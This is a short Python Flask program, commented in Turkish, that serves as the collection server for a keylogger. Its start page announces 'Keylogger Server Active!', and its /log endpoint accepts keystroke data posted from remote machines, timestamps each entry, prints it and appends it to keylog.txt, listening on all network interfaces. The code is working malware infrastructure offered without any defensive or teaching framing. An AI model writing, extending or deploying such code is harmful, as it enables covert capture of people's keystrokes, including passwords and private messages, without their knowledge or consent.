from flask import Flask, request
import datetime

app = Flask(__name__)
LOG_FILE = "keylog.txt"

@app.route('/')
def home():
    return "Keylogger Sunucusu Aktif!"

@app.route('/log', methods=['POST'])
def log_key():
    data = request.get_json()
    key_data = data.get('key')
    
    # Hatalı satır düzeltildi:
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {key_data}"
    
    print(log_entry)  # Terminale yaz
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry + "\n")
    
    return "Logged", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
